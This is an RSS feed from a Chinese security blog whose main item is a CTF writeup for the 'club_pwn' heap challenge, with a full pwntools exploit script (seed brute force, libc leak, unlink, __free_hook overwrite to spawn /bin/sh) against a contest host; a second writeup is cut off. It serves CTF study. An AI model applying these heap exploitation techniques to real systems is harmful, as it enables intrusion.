<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>http://0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Fri, 03 Nov 2017 08:11:27 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>看雪CTF 第四题club_pwn writeup</title>
      <link>http://0x48.pw/2017/11/03/0x3C/</link>
      <guid>http://0x48.pw/2017/11/03/0x3C/</guid>
      <pubDate>Fri, 03 Nov 2017 03:47:19 GMT</pubDate>
      <description>
      
        &lt;p&gt;前几天做了看雪ctf的一道pwn题，但是工作比较忙，一直没时间写wp，今天有空了，把wp补上&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>前几天做了看雪ctf的一道pwn题，但是工作比较忙，一直没时间写wp，今天有空了，把wp补上</p>
<a id="more"></a>
<p>据说这题出题人出题失误，导致题目难度大大下降，预期是house_of_orange的，但是利用unlink就能做了</p>
<h2 id="获取ELF基地址"><a href="#获取ELF基地址" class="headerlink" title="获取ELF基地址"></a>获取ELF基地址</h2><p>程序中有一个猜随机数的功能，代码大致逻辑如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">*seed = &amp;seed;</div><div class="line">srand(&amp;seed);</div><div class="line">......</div><div class="line">v1 = rand();</div><div class="line">puts(&quot;Please input the number you guess:&quot;);</div><div class="line">printf(&quot;&gt; &quot;);</div><div class="line">if ( v1 == sub_AFA() )</div><div class="line">	result = printf(&quot;G00dj0b!You get a secret: %ld!\n&quot;, *&amp;seed);</div><div class="line">else</div><div class="line">	result = printf(&quot;Wr0ng answer!The number is %d!\n&quot;, v1);</div><div class="line">return result;</div><div class="line"></div><div class="line">.bss:0000000000202148 seed</div></pre></td></tr></table></figure>
<p>使用seed变量的地址作为伪随机数生成器的种子, 因为这个程序开启了PIE保护，所以实际上每次程序运行，种子都是不一样的, 然后随机生成一个数让你猜，猜对了告诉你种子，猜错了告诉你这个随机数</p>
<p>如果我们能得到种子，因为ELF基地址和seed地址的偏移值是固定的，所以我们就能算出ELF的基地址了</p>
<p>然后去翻阅了下random的源码：<a href="https://code.woboq.org/userspace/glibc/stdlib/random.c.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/random.c.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">207 void __srandom (unsigned int x)</div><div class="line">209 &#123;</div><div class="line">210     __libc_lock_lock (lock);</div><div class="line">211    (void) __srandom_r (x, &amp;unsafe_state);</div><div class="line">212    __libc_lock_unlock (lock);</div><div class="line">213 &#125;</div><div class="line">214</div><div class="line">215 weak_alias (__srandom, srandom)</div><div class="line">216 weak_alias (__srandom, srand)</div></pre></td></tr></table></figure>
<p>发现，<code>__srandom</code>的参数是无符号整型，长度只有32bit</p>
<p>虽然开了PIE，但ELF的基地址因为系统页对其的原因，最后12bit固定是0，所以，我们只需要爆破20bit，这是非常容易的，下面是部分payload代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">def get_rand_num():</div><div class="line">    guess_num(123)</div><div class="line">    r.readuntil(&quot;is &quot;)</div><div class="line">    random_num = int(r.readuntil(&quot;!&quot;)[:-1])</div><div class="line">    return random_num</div><div class="line"></div><div class="line">def get_elf_base(random_num):</div><div class="line">    guess_num(random_num)</div><div class="line">    r.readuntil(&quot;secret:&quot;)</div><div class="line">    elf_base = int(r.readuntil(&quot;!&quot;)[:-1])</div><div class="line">    return elf_base-seed_address</div><div class="line"></div><div class="line">def guest(random_num):</div><div class="line">    seed_base = 0x202148</div><div class="line">    libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</div><div class="line">    for x in xrange(0x10000000, 0xfffff000, 0x1000):</div><div class="line">        libc.srand(x+seed_base)</div><div class="line">        if libc.rand() == random_num:</div><div class="line">            next_randnum = libc.rand()</div><div class="line">            break</div><div class="line">    return next_randnum</div><div class="line"></div><div class="line">def main():</div><div class="line">    random_num = get_rand_num()</div><div class="line">    next_randnum = guest(random_num)</div><div class="line">    elf_base = get_elf_base(next_randnum)</div><div class="line">    print &quot;get ELF base address: 0x%x&quot;%elf_base</div></pre></td></tr></table></figure>
<p>因为python的random和c的是不一样的，所以这里使用ctypes去调用libc中的random</p>
<h2 id="ELF中的漏洞"><a href="#ELF中的漏洞" class="headerlink" title="ELF中的漏洞"></a>ELF中的漏洞</h2><p>最关键的一个就是有一个bool标志位，默认值是0，表示该box没有malloc，当malloc后标志位会设置为1，但是当free后，却没有把标志位清零，这就导致可以无限free，一个被free的box，也可以修改和输出box的内容</p>
<p>另一个关键的漏洞是修改box内容的函数中存在off by one</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">for ( i = 0; dword_202090[v3] &gt;= i; ++i )</div><div class="line">&#123;</div><div class="line">    read(0, &amp;buf, 1uLL);</div><div class="line">    if ( buf == 10 )</div><div class="line">        break;</div><div class="line">        *(i + qword_202100[v3]) = buf;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果长度有24的box，却可以输入25个字符</p>
<p>还有一个也算漏洞的是再show message函数中，输出使用了puts，输出是根据<code>\x00</code>判断结尾，而不是长度，而在修改message的函数中也没有在用户输入的数据结尾加<code>\x00</code>，所以有可能导致信息泄露，不过这个漏洞对我来说不重要，我的利用方法中，不包含其信息泄露的利用</p>
<h2 id="获取LIBC基地址"><a href="#获取LIBC基地址" class="headerlink" title="获取LIBC基地址"></a>获取LIBC基地址</h2><p>泄露LIBC地址的思路很简单，上面说了当一个box被free后因为标志位没有被清零，所以任然可以往里面写数据，输出数据。</p>
<p>如果我们free一个非fast chunk的chunk，也就是说free一个chunk size大于maxfastsize的chunk，将会和unsortbin形成双链表，这个时候的结构如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">prev size</th>
<th style="text-align:center">chunk size</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">fd</td>
<td style="text-align:center">bk</td>
</tr>
</tbody>
</table>
<p>这个时候fd和bk都指向arena中的top_chunk指针，我们能通过输出该box获取到该地址，然后根据偏移值计算出libc的基地址，部分代码如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">def get_libc_base():</div><div class="line">    free_box(3)</div><div class="line">    show_message(3)</div><div class="line">    data = r.readuntil(&quot;You&quot;)[:-3].strip()</div><div class="line">    top = u64(data+&quot;\x00\x00&quot;)</div><div class="line">    return top - top_chunk</div><div class="line"></div><div class="line">def main():</div><div class="line">    ....</div><div class="line">    create_box(1, 24)</div><div class="line">    create_box(2, 168)</div><div class="line">    create_box(3, 184)</div><div class="line">    create_box(4, 200)</div><div class="line">    libc_base = get_libc_base()</div><div class="line"></div><div class="line">    print &quot;get libc base address: 0x%x&quot;%libc_base</div></pre></td></tr></table></figure>
<p>free的那个box不能是最后一个chunk，否则会和top chunk合并</p>
<h2 id="unlink利用"><a href="#unlink利用" class="headerlink" title="unlink利用"></a>unlink利用</h2><p>网上很多unlink的文章，我就不细说了，简单的来说就是要过一个判断，执行一个指令</p>
<p>需要过一个判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd-&gt;bk == P</div><div class="line">P-&gt;bk-&gt;fd == P</div></pre></td></tr></table></figure>
<p>执行一个指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FD = P-&gt;fd</div><div class="line">BK = P-&gt;bk</div><div class="line">FD-&gt;bk = BK</div><div class="line">BK-&gt;fd = FD</div></pre></td></tr></table></figure>
<p>当利用之前的代码，泄露完libc地址后，堆布局是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">0x555555757410:	0x0000000000000000	0x0000000000000021   &lt;- box1</div><div class="line">0x555555757420:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757430:	0x0000000000000000	0x00000000000000b1   &lt;- box2</div><div class="line">0x555555757440:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757450:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757460:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757470:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757480:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757490:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574a0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574c0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574e0:	0x0000000000000000	0x00000000000000c1    &lt;- box3</div><div class="line">0x5555557574f0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</div><div class="line">0x555555757500:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757510:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757520:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757530:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757540:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757550:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757560:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757570:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757580:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757590:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575a0:	0x00000000000000c0	0x00000000000000d0    &lt;- box4</div><div class="line">0x5555557575b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575c0:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
<p>然后在.bss段有个地方储存着box的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/6gx 0x202100+0x555555554000</div><div class="line">0x555555756100:	0x0000000000000000	0x0000555555757420</div><div class="line">0x555555756110:	0x0000555555757440	0x5555557574f0</div><div class="line">0x555555756120:	0x00005555557575b0	0x0000000000000000</div></pre></td></tr></table></figure>
<p>因为在free box函数的代码中，有一个判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if ( !dword_202130[v1] || dword_2020B0[v1] )</div><div class="line">    return puts(&quot;You can not destroy the box!&quot;);</div></pre></td></tr></table></figure>
<p>而dword_2020B0是已经初始化过，然后没有代码修改过的变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.data:00000000002020B0 dword_2020B0      dd 2 dup(1), 2 dup(0), 2 dup(1)</div></pre></td></tr></table></figure>
<p>扩展开了就是<code>[1, 1, 0, 0, 1, 1]</code></p>
<p>所以只有2， 3两个box能被free</p>
<p>在之前已经free过了box3，如果再次free box3，无法触发unlink操作，unlink操作只有在前一个或者后一个chunk未被使用时才会触发，所以我们需要通过free box2来进行触发unlink操作</p>
<p>通过leave message函数来构造一个堆结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/64gx 0x555555757410</div><div class="line">0x555555757410:	0x0000000000000000	0x0000000000000021</div><div class="line">0x555555757420:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757430:	0x0000000000000000	0x00000000000000c1    修改长度为0xc1</div><div class="line">0x555555757440:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757450:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757460:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757470:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757480:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757490:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574a0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574c0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574e0:	0x0000000000000000	0x00000000000000c1</div><div class="line">0x5555557574f0:	0x00007ffff7dd1b78	0x00000000000000b1     构造成一个新的堆，长度为0xb1</div><div class="line">0x555555757500:	0x0000555555756100	0x0000555555756108     构造fd和bk</div><div class="line">0x555555757510:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757520:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757530:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757540:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757550:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757560:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757570:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757580:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757590:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575a0:	0x00000000000000b0	0x00000000000000d0      修改prev_size为0xb0</div><div class="line">0x5555557575b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575c0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575e0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575f0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757600:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
<p>构造了一个fd和bk指向存储box 地址的.bss段，这样就能构成一个双链表，bypass unlink的check:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd-&gt;bk == P</div><div class="line">P-&gt;bk-&gt;fd == P</div></pre></td></tr></table></figure>
<p>不过这个时候如果free box2，会报错退出，报错的内容是 <code>free(): corrupted unsorted chunks</code></p>
<p>去源码中搜一下该error的check:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">4248  bck = unsorted_chunks(av);</div><div class="line">4249  fwd = bck-&gt;fd;</div><div class="line">4250  if (__glibc_unlikely (fwd-&gt;bk != bck))</div><div class="line">4251      malloc_printerr (&quot;free(): corrupted unsorted chunks&quot;)</div></pre></td></tr></table></figure>
<p>bck指向unsortbin，所以fwd指向box3，然而box3的bk已经被构造成了新chunk的size位，所以报错退出了</p>
<p>这个时候只需要在free box2之前，malloc一个box5，这样将会把unsortbin中的box3分类到smallbin中，从而bypass unsortbin check</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在free box2之后，内存大致如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/6gx 0x202100+0x555555554000</div><div class="line">0x555555756100:	0x0000000000000000 0x0000555555757420</div><div class="line">0x555555756110:	0x0000555555757440 0x0000555555756100</div><div class="line">0x555555756120:	0x00005555557575b0 0x0000555555757680</div></pre></td></tr></table></figure>
<p>box3的地址已经指向该bss段，从而我们已经可以做到任意地址写了</p>
<p>我的利用思路是，把box 2修改为free_hook的地址，然后把box 0修改为<code>/bin/sh\0</code>正好8byte，这样box 3就是一个<code>/bin/sh</code>字符串了</p>
<p>我们只需要在free_hook中写上system的地址，调用free(box 3)，则相当于调用system(“/bin/sh\0”)，从而达到getshell</p>
<p>完整payload如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">    context.log_level = <span class="string">"debug"</span></div><div class="line">    r = process(<span class="string">"./club"</span>)</div><div class="line">    e = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    r = remote(<span class="string">"123.206.22.95"</span>, <span class="number">8888</span>)</div><div class="line">    e = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"></div><div class="line">malloc_hook = e.symbols[<span class="string">'__malloc_hook'</span>]</div><div class="line">free_hook = e.symbols[<span class="string">'__free_hook'</span>]</div><div class="line">system_address = e.symbols[<span class="string">'system'</span>]</div><div class="line">top_chunk = malloc_hook + <span class="number">0x68</span></div><div class="line">seed_address = <span class="number">0x202148</span></div><div class="line">addr_list = <span class="number">0x202100</span></div><div class="line">one_gadget = <span class="number">0xf0274</span></div><div class="line">puts_got = <span class="number">0x202028</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_box</span><span class="params">(n, l)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"1"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(l))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_box</span><span class="params">(n)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"2"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(n, msg)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"3"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line">    r.sendline(msg)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_message</span><span class="params">(n)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"4"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_num</span><span class="params">(n)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"5"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_num</span><span class="params">()</span>:</span></div><div class="line">    guess_num(<span class="number">123</span>)</div><div class="line">    r.readuntil(<span class="string">"is "</span>)</div><div class="line">    random_num = int(r.readuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>])</div><div class="line">    <span class="keyword">return</span> random_num</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">guest</span><span class="params">(random_num)</span>:</span></div><div class="line">    seed_base = <span class="number">0x202148</span></div><div class="line">    libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0x10000000</span>, <span class="number">0xfffff000</span>, <span class="number">0x1000</span>):</div><div class="line">        libc.srand(x+seed_base)</div><div class="line">        <span class="keyword">if</span> libc.rand() == random_num:</div><div class="line">            next_randnum = libc.rand()</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> next_randnum</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_elf_base</span><span class="params">(random_num)</span>:</span></div><div class="line">    guess_num(random_num)</div><div class="line">    r.readuntil(<span class="string">"secret:"</span>)</div><div class="line">    elf_base = int(r.readuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>])</div><div class="line">    <span class="keyword">return</span> elf_base-seed_address</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_libc_base</span><span class="params">()</span>:</span></div><div class="line">    free_box(<span class="number">3</span>)</div><div class="line">    show_message(<span class="number">3</span>)</div><div class="line">    data = r.readuntil(<span class="string">"You"</span>)[:<span class="number">-3</span>].strip()</div><div class="line">    top = u64(data+<span class="string">"\x00\x00"</span>)</div><div class="line">    <span class="keyword">return</span> top - top_chunk</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    random_num = get_rand_num()</div><div class="line">    next_randnum = guest(random_num)</div><div class="line">    elf_base = get_elf_base(next_randnum)</div><div class="line">    <span class="keyword">print</span> <span class="string">"get ELF base address: 0x%x"</span>%elf_base</div><div class="line">    create_box(<span class="number">1</span>, <span class="number">24</span>)</div><div class="line">    create_box(<span class="number">2</span>, <span class="number">168</span>)</div><div class="line">    create_box(<span class="number">3</span>, <span class="number">184</span>)</div><div class="line">    create_box(<span class="number">4</span>, <span class="number">200</span>)</div><div class="line">    libc_base = get_libc_base()</div><div class="line">    create_box(<span class="number">5</span>, <span class="number">300</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"get libc base address: 0x%x"</span>%libc_base</div><div class="line">    set_list2_size = p64(<span class="number">0xc1</span>)*<span class="number">3</span> + <span class="string">"\xc1"</span></div><div class="line">    leave_message(<span class="number">1</span>, set_list2_size)</div><div class="line">    set_list3 = p64(<span class="number">0</span>) + p64(<span class="number">0xb1</span>) + p64(elf_base+addr_list) + p64(elf_base+addr_list+<span class="number">8</span>)</div><div class="line">    set_list3 += <span class="string">"a"</span>*<span class="number">0x90</span>+p64(<span class="number">0xb0</span>)</div><div class="line">    leave_message(<span class="number">3</span>, set_list3)</div><div class="line">    free_box(<span class="number">2</span>)</div><div class="line">    write_address_list = <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span>*<span class="number">8</span> + p64(libc_base+free_hook)</div><div class="line">    leave_message(<span class="number">3</span>, write_address_list)</div><div class="line">    leave_message(<span class="number">2</span>, p64(libc_base+system_address))</div><div class="line">    free_box(<span class="number">3</span>)</div><div class="line">    <span class="comment"># leave_message(3, "aaaaaaaa")</span></div><div class="line">    <span class="comment"># show_message(3)</span></div><div class="line">    r.interactive()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>unlink原理很早我就知道了，但是却是第一次实践，理论和实际还是差很大的，所以我踩了挺多的坑，花了挺多的时间</p>
<p>我还考虑过fastbin的double free的利用，但是失败了……</p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/11/03/0x3C/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Pwnhub 2013的国庆 writeup</title>
      <link>http://0x48.pw/2017/10/04/0x3A/</link>
      <guid>http://0x48.pw/2017/10/04/0x3A/</guid>
      <pubDate>Wed, 04 Oct 2017 11:35:08 GMT</pubDate>
      <description>
      
        &lt;p&gt;不让人过节系列||没女朋友只能撸题系列的CTF题。。。&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>不让人过节系列||没女朋友只能撸题系列的CTF题。。。</p>
<a id="more"></a>
<h2 id="Step-0"><a href="#Step-0" class="headerlink" title="Step 0"></a>Step 0</h2><p>首先是<code>.DS_Store</code>信息泄露，下载下来是一个二进制文件，需要解析，google搜一搜就有了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> ds_store <span class="keyword">import</span> DSStore</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> DSStore.open(<span class="string">"DS_Store"</span>, <span class="string">"r+"</span>) <span class="keyword">as</span> f:</div><div class="line"><span class="meta">... </span>    <span class="keyword">for</span> i <span class="keyword">in</span> f:</div><div class="line"><span class="meta">... </span>        <span class="keyword">print</span> i</div><div class="line">&lt;admin Iloc&gt;</div><div class="line">&lt;admin 